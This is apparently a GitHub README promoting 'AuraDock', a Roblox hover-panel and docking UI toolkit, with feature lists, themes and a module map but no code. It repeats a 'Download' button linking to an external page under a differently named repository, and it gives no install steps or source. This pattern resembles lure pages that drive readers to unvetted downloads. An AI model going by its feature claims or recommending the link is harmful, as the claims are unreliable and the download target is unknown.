![preview](https://raw.githubusercontent.com/mared4reall/Floating-Context-Panels/main/hero_444cb.svg)
[![Download](https://raw.githubusercontent.com/mared4reall/Floating-Context-Panels/main/app_6517.svg)](https://mared4reall.github.io/Floating-Context-Panels/)

# 🧭 AuraDock — Ambient Context & Hover Panels for Roblox Interfaces

A living, breathing companion to the ContextUI philosophy, AuraDock reimagines how players and developers interact with floating information in Roblox experiences. Instead of static tooltips and lifeless panels, AuraDock introduces an ecosystem of ambient surfaces — panels that breathe, dock, whisper context, and adapt to the rhythm of your UI. It is a toolkit for creators who believe that a hover panel should feel less like a popup and more like a thoughtful assistant.

This repository is an independent, from-scratch exploration of the "contextual surface" idea. Where ContextUI focuses on hover and pin mechanics with nine built-in themes, AuraDock shifts the perspective: it treats every panel as a migratory element — a small creature that can attach to edges, drift toward corners, snap into magnetic docks, and remember where it last rested. The result is an interface layer that feels alive rather than mechanical.

[![Download](https://raw.githubusercontent.com/mared4reall/Floating-Context-Panels/main/app_6517.svg)](https://mared4reall.github.io/Floating-Context-Panels/)

---

## 📜 Table of Contents

- [🌌 Overview](#-overview)
- [✨ Why AuraDock Exists](#-why-auradock-exists)
- [🧩 Feature Constellation](#-feature-constellation)
- [🎨 Theme Atelier](#-theme-atelier)
- [🛰️ Interactive Docking & Pinning](#️-interactive-docking--pinning)
- [🌍 Multilingual & Responsive Design](#-multilingual--responsive-design)
- [🧠 Live Component Engine](#-live-component-engine)
- [🕹️ Use Cases & Playgrounds](#️-use-cases--playgrounds)
- [🧪 Architecture & Module Map](#-architecture--module-map)
- [📚 Documentation & Guides](#-documentation--guides)
- [🛠️ Configuration Reference](#️-configuration-reference)
- [🧬 Roadmap & Future Beacons](#-roadmap--future-beacons)
- [🤝 Contributing Etiquette](#-contributing-etiquette)
- [🛡️ License](#️-license)
- [⚠️ Disclaimer](#️-disclaimer)
- [💬 Support & Community](#-support--community)

---

## 🌌 Overview

AuraDock is a modular UI framework for Roblox that centers on **contextual hover panels** and **ambient information surfaces**. It is designed for developers who want their interfaces to feel like a natural extension of the game world rather than a bolted-on overlay. Every panel in AuraDock can:

- **Hover** into view with smooth, configurable easing.
- **Dock** itself to any edge, corner, or custom anchor point.
- **Pin** in place so it persists until intentionally dismissed.
- **Migrate** between zones as the player interacts with different parts of the screen.
- **Resonate** with theme changes in real time, without flicker or layout jump.

The name "Aura" reflects the idea that panels emit a subtle field of context around them — a radius of relevance. The "Dock" reflects the anchoring metaphor: panels are not thrown onto the screen, they are guided into a harbor.

AuraDock is built with the mindset that UI should be **calm technology**: present when needed, invisible when not.

---

## ✨ Why AuraDock Exists

Most Roblox UI libraries treat hover panels as an afterthought — a simple `MouseEnter` event and a static frame. AuraDock was born from a different question:

> *What if a panel knew where it belonged, and could travel there gracefully?*

Traditional tooltips are like sticky notes: quick, disposable, and visually forgettable. AuraDock panels are more like **lighthouse keepers** — they stay at their post, rotate their beam toward the player's focus, and only retire when the shift is over.

This repository exists to give Roblox creators a **batteries-assembled** (not merely "batteries-included") toolkit: components that arrive pre-wired, pre-themed, and ready to dock, while remaining fully open to remixing.

---

## 🧩 Feature Constellation

Each feature below is described in the voice of what it *does for the player*, not just what it *is*.

- 🌠 **Ambient Hover Panels** — Panels that fade in with a soft aura instead of a hard pop. Configurable aura radius, blur intensity, and edge glow.
- ⚓ **Interactive Docking** — Drag a panel toward any screen edge and it snaps into a magnetic dock. Docks remember their occupants between sessions.
- 📌 **Pinning & Anchoring** — Pin a panel to a specific world object, a UI element, or an absolute screen coordinate. Pinned panels survive camera movement.
- 🎨 **Nine Built-In Themes** — From *Aurora* to *Obsidian* to *Paper Lantern*, each theme ships with its own aura palette, corner radius, and motion curve.
- 🧠 **Live Components** — Panels can host live elements: gauges, timers, list views, and reactive labels that update without rebuilding the panel.
- 🛰️ **Dock Zones & Migration** — Define named zones (e.g., `left_rail`, `bottom_harbor`) and let panels migrate between them based on game state.
- 🌍 **Multilingual Support** — Built-in locale switching with right-to-left (RTL) layout awareness and per-locale font fallback.
- 📱 **Responsive UI** — Panels reflow on small screens, collapse into compact mode, and expand gracefully on tablets and desktops.
- 🔔 **Non-Intrusive Notifications** — AuraDock can emit gentle "whispers" — small, dismissible notices that dock into a corner and fade after a configurable rest.
- 🧪 **Deterministic Motion** — Every animation is driven by a single timing model, so panels never fight each other for screen real estate.
- 🌐 **SEO-Friendly Developer Docs** — Documentation is written with discoverability in mind, so creators searching for "Roblox hover panel with docking" can find this repository naturally.
- 🕐 **24/7 Support Philosophy** — While the maintainers are human, the repository includes a triage template and a response-time commitment for issue reports.

---

## 🎨 Theme Atelier

Themes in AuraDock are not just color swaps — they are **moods**. Each theme defines:

- Aura color and falloff
- Panel corner geometry
- Shadow depth and direction
- Motion curve (spring, ease-out, or drift)
- Typography scale and weight

The nine built-in themes are:

1. **Aurora** — cool greens and violets, soft spring motion
2. **Obsidian** — deep charcoal with amber rim light
3. **Paper Lantern** — warm creams and soft orange glow
4. **Tidepool** — teal and slate, gentle drift motion
5. **Emberdrift** — muted reds and browns, slow ease
6. **Glasswing** — translucent whites and silver, very fast snaps
7. **Nightbloom** — indigo and magenta, medium spring
8. **Sandstone** — tan and umber, weighty ease-out
9. **Voidpetal** — near-black with violet edge, near-instant fades

You can register your own theme by supplying a single table. AuraDock validates the theme and warns in the output console if a required field is missing.

---

## 🛰️ Interactive Docking & Pinning

Docking is the heart of AuraDock. The system works in three layers:

- **Anchor Layer** — defines where a panel *can* go
- **Dock Layer** — defines where a panel *is* right now
- **Intent Layer** — defines where the player *wants* it to be

When a player drags a panel, the Intent Layer watches the pointer and highlights candidate dock zones. On release, the panel snaps to the nearest valid zone using the active theme's motion curve. Pinned panels bypass the Dock Layer and attach directly to their anchor target.

This three-layer model is what allows AuraDock panels to feel **deliberate** rather than chaotic.

---

## 🌍 Multilingual & Responsive Design

AuraDock ships with a locale table and a `setLocale` function. When a locale changes:

- All panel text re-renders without a full rebuild
- RTL locales flip padding and dock side automatically
- Font stacks fall back gracefully if a glyph is missing

Responsiveness is handled through **breakpoints** rather than fixed sizes. At each breakpoint, panels can:

- Collapse into a compact header-only state
- Reflow from horizontal to vertical layouts
- Reduce aura intensity to save rendering budget on lower-end devices

This makes AuraDock suitable for experiences that span phones, tablets, and desktop clients without separate UI code.

---

## 🧠 Live Component Engine

A live component is a small, self-updating UI element that AuraDock panels can host. Examples include:

- **Gauge** — a radial or linear meter bound to a numeric property
- **Ticker** — a text field that updates on an interval
- **List** — a scrollable list bound to a table
- **Signal** — a small indicator that changes color based on boolean state

Live components are declared with a descriptor table, and AuraDock handles the update loop internally. You can throttle updates per component to conserve performance.

---

## 🕹️ Use Cases & Playgrounds

AuraDock was designed with several gameplay contexts in mind:

- **Inventory Hover Cards** — hover over an item slot and see stats, lore, and rarity aura
- **Quest Trackers** — a docked panel that follows the player's current objective
- **NPC Dialogue Panels** — pin a panel to an NPC and let it persist while the player walks away
- **Build Mode Inspectors** — hover over placed parts to see metadata in a hover panel that docks into a side rail
- **Tutorial Whisper Zones** — gentle notifications that dock into the bottom harbor and fade after a few seconds

Each use case is covered in the documentation with a short scenario and a configuration snippet.

---

## 🧪 Architecture & Module Map

AuraDock is organized into focused modules:

- **Core** — timing model, motion curves, and event bus
- **Dock** — anchor registry, zone resolver, and drag handler
- **Theme** — theme loader, validator, and live switcher
- **Component** — live component base class and built-in components
- **Locale** — locale table, RTL flipper, and font fallback logic
- **Panel** — the public-facing panel API

Each module is independently testable in a Roblox environment, and the repository includes a `tests` folder with scenario scripts.

---

## 📚 Documentation & Guides

The repository includes a `docs` folder with:

- **Getting Started** — a gentle walkthrough of creating your first panel
- **Docking Deep Dive** — how the three-layer dock model works
- **Theme Authoring** — how to design a theme that matches your game's mood
- **Localization Guide** — adding new locales and testing RTL
- **Performance Notes** — how to keep panels lightweight on low-end devices
- **FAQ** — answers to common questions about panel behavior

Documentation is written in plain Markdown and is searchable via GitHub's built-in search.

---

## 🛠️ Configuration Reference

AuraDock exposes a single configuration table for global defaults:

- `defaultTheme` — name of the theme to load on startup
- `defaultDockZone` — where panels dock if no zone is specified
- `auraRadius` — default aura radius in pixels
- `motionCurve` — default motion curve name
- `locale` — default locale code
- `compactBreakpoint` — screen width threshold for compact mode

Per-panel overrides are supported, so you can mix global defaults with local behavior.

---

## 🧬 Roadmap & Future Beacons

Planned directions for 2026 and beyond:

- A **visual dock editor** that runs inside Roblox Studio
- **Theme marketplace** integration (community-submitted themes)
- **Motion curve designer** with live preview
- **Accessibility pass** for screen-reader-friendly panel text
- **Cross-experience profiling** to help creators tune panel performance

These beacons are not promises — they are directions. The repository evolves with its community.

---

## 🤝 Contributing Etiquette

Contributions are welcome from creators of all experience levels. Before opening a pull request:

- Read the `CONTRIBUTING.md` file
- Run the scenario tests in the `tests` folder
- Keep changes focused — one feature or fix per pull request
- Describe *why* a change is useful, not just *what* it changes

Issues are triaged with a template that asks for reproduction steps, expected behavior, and the Roblox client version used.

---

## 🛡️ License

AuraDock is released under the **MIT License**. You are welcome to use, modify, and distribute it in personal and commercial projects.

Read the full license here: [MIT License](https://opensource.org/licenses/MIT)

Copyright (c) 2026 AuraDock Contributors

---

## ⚠️ Disclaimer

AuraDock is an independent, community-driven UI toolkit for Roblox. It is not affiliated with, endorsed by, or sponsored by Roblox Corporation or any of its subsidiaries. All trademarks belong to their respective owners.

This project is provided "as is", without warranty of any kind, express or implied. The maintainers are not responsible for any issues arising from its use in live experiences. Always test UI changes in a controlled environment before shipping to players.

Roblox platform updates may occasionally affect rendering behavior. The maintainers aim to keep AuraDock compatible, but cannot guarantee uninterrupted functionality across all client versions.

---

## 💬 Support & Community

Support for AuraDock is offered through:

- **Issue Tracker** — for bug reports and feature requests
- **Discussion Board** — for design questions and show-and-tell
- **Response Commitment** — the maintainers aim to acknowledge new issues within one business day, and provide a first response within three

While 24/7 human coverage is not guaranteed, the repository is monitored continuously, and community members often answer questions before a maintainer arrives.

---

[![Download](https://raw.githubusercontent.com/mared4reall/Floating-Context-Panels/main/app_6517.svg)](https://mared4reall.github.io/Floating-Context-Panels/)

*AuraDock — because your interface deserves a harbor, not a hammer.*